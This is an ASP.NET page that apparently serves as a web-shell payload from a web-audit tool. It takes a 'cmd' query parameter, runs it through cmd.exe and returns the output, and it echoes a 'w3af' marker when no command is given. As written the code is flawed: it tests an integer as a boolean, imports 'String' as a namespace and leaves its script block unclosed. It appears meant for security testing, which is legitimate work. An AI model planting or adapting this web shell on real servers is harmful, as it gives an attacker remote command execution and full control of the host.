<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="String" %>
<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e)
{
    if ( String.Compare( Request.QueryString["cmd"],"") )
    {
        Response.Write("w3" + "af");
    }
    else
    {
        Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));
    }
}

string ExcuteCmd(string arg)
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}

